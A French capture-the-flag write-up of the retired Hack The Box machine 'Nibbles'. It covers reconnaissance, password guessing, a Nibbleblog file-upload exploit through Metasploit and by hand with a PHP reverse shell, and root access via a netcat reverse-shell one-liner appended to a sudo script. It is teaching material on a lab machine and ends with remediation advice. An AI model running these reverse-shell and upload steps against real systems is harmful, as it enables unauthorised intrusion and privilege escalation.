---
title: Restez calme et Hack The Box – Nibbles
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2021-05-25T00:20:22.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-nibbles
coverImage: https://www.freecodecamp.org/news/content/images/2021/05/synthwave-cityscape-4k-6x-1920x1080-1.jpeg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
- name: Web Security
  slug: web-security
seo_title: Restez calme et Hack The Box – Nibbles
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en tests d'intrusion.

Elle contient plusieurs challenges qui sont constamment mis à jour. Certains simulent des scénarios du monde réel et d'autres penchent plus vers un style de challenge CTF.

**Note** : _Seuls les write-ups de machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.44.51.png)

  
Nibbles est une machine facile qui se concentre sur la devinette de mots de passe et l'énumération d'applications web.

Dans ce tutoriel, nous utiliserons les outils suivants pour compromettre la box :

* nmap
* gobuster
* metasploit
* PHP reverse shell
* netcat

Commençons !

## **Étape 1** – Faire de la **reconnaissance**

La première étape avant d'exploiter une machine est de faire un peu de scan et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pourrez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

### **Scan de ports** avec Nmap

J'utiliserai **Nmap** (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité.

Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils utilisent, quel type de filtres de paquets/pare-feu sont en place, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.59.16.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v 10.129.151.27
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.57.48.png)

**-A :** Active la détection d'OS, la détection de version, le balayage par script et le traceroute

**-v :** Augmente le niveau de verbosité

**10.129.151.27** : IP de la box Nibbles

Si vous trouvez les résultats un peu trop accablants, vous pouvez essayer ceci :

```bash
nmap 10.129.151.27
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.56.30.png)

Nous pouvons voir qu'il y a 2 ports ouverts :

**Port** 22. Secure Shell (SSH), connexions sécurisées, transferts de fichiers (scp, sftp) et redirection de port

**Port** 80. Hypertext Transfer Protocol (HTTP). Ici, c'est un serveur Apache (httpd 2.4.18).

## **Étape 2** – **Visiter la** **page** **web**

À partir de la phase de reconnaissance, je décide de commencer par le port 80. Et j'obtiens une page avec un simple message "Hello World" en haut.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.00.57.png)

Je regarde le code source et je vois qu'il y a une ligne commentée :

```html
<!-- Répertoire /nibbleblog/. Rien d'intéressant ici ! -->
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.02.03.png)

Je navigue vers ce dossier et j'arrive sur ce qui ressemble à une page de blog appelée "Nibbles Yum Yum".

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.04.59.png)

Je peux voir en bas que le blog est propulsé par Nibbleblog. Je regarde ce que c'est.

Nibbleblog est décrit comme un système de blog PHP facile, rapide et gratuit. Vous pouvez trouver plus d'informations [ici](https://www.nibbleblog.com/).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.04.38.png)

Ayant cette nouvelle information, je décide de lancer **Gobuster**. Gobuster est un scanner de répertoires écrit en Go. Vous pouvez trouver plus d'informations sur l'outil [ici](https://tools.kali.org/web-applications/gobuster).

Gobuster utilise des listes de mots (wordlists) sur la box HTB Parrot qui se trouvent dans le répertoire **/usr/share/wfuzz/wordlist/**. J'utilise la wordlist "**common.txt**", mais vous pouvez en télécharger d'autres depuis **SecLists** [ici](https://github.com/danielmiessler/SecLists).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.06.56.png)

J'utilise cette commande pour la wordlist common.txt de dirb :

```bash
gobuster dir -u 10.129.151.27 -w /usr/share/wfuzz/wordlist/general/common.txt -x php,txt
```

Je me concentre également sur les fichiers .php et .txt avec le drapeau **-x** (extensions).

Il y a quelques découvertes intéressantes, dont un dossier **/**admin**/**. Je commence par vérifier le dossier **/content/**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.11.24.png)

Ensuite le fichier **/install.php**. Je clique sur update :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.10.15.png)

J'arrive sur la page **/update.php** que j'ai trouvée sur Gobuster. Il y a quelques liens :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.09.54.png)

Je navigue vers le premier, la page **/config.xml** :

```bash
10.129.151.27/nibbleblog/content/private/config.xml
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.19.02.png)

Je parcours le fichier xml et je note l'e-mail que j'y trouve :

```bash
admin@nibbles.com
```

ce qui pourrait potentiellement être une information utilisateur précieuse.

Je continue à parcourir les autres pages trouvées avec Gobuster. Je navigue vers le dossier **/admin/** :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.12.23.png)

Et vers la page **/admin.php**. Je trouve enfin une page de connexion !

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.11.55.png)

J'essaie des identifiants bidons pour voir le comportement de la page. Les paramètres du formulaire sont :

```bash
username=test&password=test
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.22.21.png)

Je navigue vers la dernière page trouvée sur Gobuster, la page **/users.xml**. Je peux voir qu'il y a un nom d'utilisateur, **admin**, mais aussi qu'il semble y avoir un mécanisme de liste noire en place. Je le suppose avec les balises <blacklist> et mon adresse IP HTB a été ajoutée à la fin. Le compteur d'échecs de **1** était mon test précédent avec les identifiants bidons.

Il semble que nous ne pourrons pas forcer brutalement (brute force) la page de connexion. Nous devrons deviner la combinaison utilisateur:mot de passe.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.22.44.png)

## **Étape 3**a – Exploiter la **vulnérabilité** Nibbleblog avec **Metasploit**

Depuis la phase de reconnaissance sur **/update.php**, il y avait des informations sur la version de Nibbleblog.

```bash
Nibbleblog 4.0.3 "Coffee"
```

Je cherche la version sur Google pour vérifier s'il existe une vulnérabilité connue sur cette version spécifique. J'en trouve une sur **Exploit Database**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.25.55.png)
_[https://www.exploit-db.com/exploits/38489](https://www.exploit-db.com/exploits/34900)_

Il semble y avoir un exploit Metasploit disponible pour cette vulnérabilité.

J'utilise ensuite **Metasploit**, qui est un Framework de test d'intrusion qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)

Je lance le **Metasploit Framework** et je cherche la commande que je devrais utiliser pour l'exploit.

N'oubliez pas de mettre à jour Metasploit lorsque vous le lancez avec cette commande :

```bash
msfupdate
```

Je cherche l'exploit avec cette commande :

```bash
search nibbleblog
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.27.59.png)

C'est le même que celui que j'ai trouvé sur Exploit Database. J'obtiens plus d'informations avec :

```bash
info 0
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.29.19.png)

Cela me donne également une idée des options requises pour l'exploit. Nous pouvons voir toutes celles qui sont nécessaires – y compris une combinaison utilisateur:mot de passe valide :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.29.47.png)

La section d'information nous donne quelques liens pour en savoir plus sur la vulnérabilité. Le premier lien redirige vers la **National Vulnerability Database**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.30.40.png)
_https://nvd.nist.gov/vuln/detail/CVE-2015-6967_

Le deuxième lien est un blog de recherche en sécurité sur l'exploitation manuelle de la vulnérabilité. J'utiliserai cette méthode à l'étape suivante.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.31.41.png)
_https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html_

Maintenant que nous avons un peu plus de contexte, utilisons l'exploit avec :

```bash
use 0
```

Vous devriez maintenant voir le terminal msf6 réglé sur :

```bash
exploit(multi/http/nibbleblog_file_upload)
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.34.13.png)

Je vais maintenant définir les différentes options avec ces commandes :

```bash
set USERNAME admin
```

```bash
set PASSWORD nibbles
```

Je règle la combinaison utilisateur:mot de passe sur admin:nibbles. J'ai trouvé le nom d'utilisateur admin sur la page **/users.xml** et j'ai tenté ma chance pour le mot de passe avec l'e-mail que j'ai trouvé sur la page **/config.xml** (admin@nibbles.com)

```bash
set RHOSTS 10.129.151.27
```

```bash
set LHOST 10.10.14.110
```

Je définis l'URI cible vers la page du blog :

```bash
set TARGETURI /nibbleblog/
```

Je lance la commande **check** – car j'ai vu qu'elle était disponible quand j'ai vérifié les infos sur l'exploit. La cible semble être vulnérable. C'est aussi la confirmation que les options ont été correctement définies.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.44.34.png)

Je vérifie les options avant de lancer l'exploit :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.45.02.png)

Je lance l'exploit avec :

```bash
run
```

et j'obtiens une session **Meterpreter** en retour.

Voici la définition de Meterpreter par [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) :

> Meterpreter est un payload avancé, extensible dynamiquement, qui utilise des stagers d'injection de DLL _in-memory_ et qui est étendu via le réseau au moment de l'exécution. Il communique via le socket du stager et fournit une API Ruby complète côté client. Il dispose d'un historique des commandes, de la complétion par tabulation, de canaux, et plus encore.

Vous pouvez en savoir plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.46.11.png)

## **Étape** 3b – Exploiter la **vulnérabilité** Nibbleblog **sans** **Metasploit**

Retour à la page **/admin.php**. Je dois deviner le mot de passe. En regardant mes notes, j'ai trouvé le nom d'utilisateur admin sur la page **/users.xml** et j'ai tenté ma chance pour le mot de passe avec l'e-mail trouvé sur la page **/config.xml** (admin@nibbles.com).

Je règle la combinaison utilisateur:mot de passe sur admin:nibbles.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.14.19.png)

Et ça fonctionne !

Je peux voir le tableau de bord de Nibbleblog. Nous voyons sur le panneau de notifications à droite que ma **tentative de connexion échouée** a été capturée.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.14.40.png)

Je navigue vers l'onglet **Plugins** et vers **My image** :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.15.43.png)

Nous pouvons télécharger un **PHP reverse shell** en tant que fichier image :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.15.59.png)

**Pentestmonkey** possède une liste de reverse shells, et j'utiliserai celui en PHP. Le code est disponible sur leur dépôt GitHub.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.26.33.png)

Cliquez sur le fichier **php-reverse-shell.php** :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.26.50.png)

C'est le morceau de code que nous devrons télécharger sur le tableau de bord de Nibbleblog :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.27.11.png)

Je dois modifier cette section avec mon IP HTB.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.28.31.png)

De retour dans mon terminal, je crée un nouveau fichier appelé **image.php** avec :

```bash
nano image.php
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.29.02.png)

Je modifie le fichier pour la variable **$IP** avec mon IP HTB :

```bash
$IP = '10.10.14.110';
```

Je laisse le port sur **1234** :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.29.36.png)

Retour au tableau de bord Nibbleblog. Je télécharge le fichier **image.php** fraîchement créé avec le code du reverse shell. Ignorez les avertissements.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.24.08.png)

Je configure un écouteur **Ncat** sur le port **1234** pour intercepter la connexion du reverse shell.

> Ncat est un utilitaire réseau riche en fonctionnalités qui lit et écrit des données sur les réseaux à partir de la ligne de commande. Ncat a été écrit pour le projet Nmap comme une réimplémentation très améliorée du vénérable [Netcat](http://sectools.org/tool/netcat/). Il utilise à la fois TCP et UDP pour la communication et est conçu pour être un outil d'arrière-plan fiable pour fournir instantanément une connectivité réseau à d'autres applications et utilisateurs.

Vous pouvez en savoir plus sur Ncat [ici](https://nmap.org/book/ncat-man.html).

```bash
nc -nlvp 1234
```

Et je navigue vers la page pour déclencher l'exploit :

```bash
10.129.151.27/nibbleblog/content/private/plugins/my_images/image.php
```

J'obtiens alors une session en retour !

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.25.29.png)

## **Étape 4 - Chercher le flag user.txt**

Je vérifie où je me trouve sur la machine :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.48.31.png)

Et je commence à remonter jusqu'au dossier **home**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.49.39.png)

Et je trouve le flag utilisateur ! Je peux vérifier le contenu du fichier avec :

```bash
cat user.txt
```

## **Étape 5 -** Chercher **le flag root.txt**

Je reviens au dossier **/**. Je ne peux pas accéder au dossier **root**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.50.25.png)

Je tape la commande suivante pour obtenir un shell standard sur le système cible :

```bash
shell
```

Je génère un shell TTY avec :

```bash
python3 -c "import pty; pty.spawn('/bin/bash/');"
```

Je dois utiliser python3 :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.52.44.png)

Je dois passer en utilisateur root pour accéder à ce dossier. J'utilise la commande :

```bash
sudo -l
```

pour comprendre quelle commande je peux exécuter sur localhost.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.53.29.png)

Je découvre que l'utilisateur **Nibbler** peut exécuter la commande **/home/nibbler/personal/stuff/monitor.sh** en tant que "root" sans mot de passe.

Trouvons ce fichier ! Je retourne dans **/home/nibbler/** et je trouve un fichier zip appelé **personal.zip**. Je décompresse le contenu avec cette commande :

```bash
unzip personal.zip
```

Je peux voir le fichier **/personal/stuff/monitor.sh** que nous recherchons :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.55.37.png)

Je vérifie le contenu du fichier avec :

```bash
cat monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.56.32.png)

Je décide d'ajouter le reverse shell à la fin de ce fichier avec :

```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14,110 1234 > /tmp/f" >> monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.10.19.png)

Je fais un cat du fichier pour vérifier s'il a été correctement ajouté à la fin :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.10.41.png)

Je configure un écouteur **Ncat** sur le port **1234** pour intercepter la connexion du reverse shell sur mon terminal :

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.11.08.png)

Et j'exécute ensuite la commande sur le terminal de Nibbler avec :

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.09.51.png)

Je suis maintenant root ! Je peux naviguer vers le dossier **root**. Je trouve le fichier root.txt et je vérifie son contenu avec :

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.12.55.png)

Félicitations ! Vous avez trouvé les deux flags.

## **Remédiations**

* Utilisez des mots de passe complexes et n'utilisez pas de mots de passe par défaut/génériques – admin:nibbles est trop simple
* Mettez à jour vers la dernière version – dans ce cas, mettez à jour vers la dernière version de Nibbleblog disponible
* Appliquez le [principe du moindre privilège](https://en.wikipedia.org/wiki/Principle_of_least_privilege) à tous vos systèmes et services

N’hésitez pas à poser des questions ou à partager avec vos amis :)

Vous pouvez voir d'autres articles de la série **Keep Calm and Hack the Box** [ici](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

Et n'oubliez pas : #**GetSecure**, #**BeSecure** & #**StaySecure** !

![Image](https://www.freecodecamp.org/news/content/images/2021/05/synthwave-cityscape-4k-6x-1920x1080.jpeg)